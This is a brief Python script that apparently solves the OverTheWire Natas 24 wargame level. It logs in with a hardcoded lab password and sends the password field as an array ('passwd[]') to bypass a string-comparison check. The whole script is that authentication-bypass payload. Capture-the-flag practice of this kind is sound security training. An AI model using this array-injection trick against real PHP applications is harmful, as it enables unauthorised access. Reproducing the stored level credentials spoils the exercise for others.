import requests, re
u='natas24'
p='OsRmXFguozKpTZZ5X14zNO43379LZveg'
l=f'http://{u}.natas.labs.overthewire.org/'
resp=requests.post(l,auth=(u, p),data={'passwd[]':'100iloveyou'})
print(resp.text)
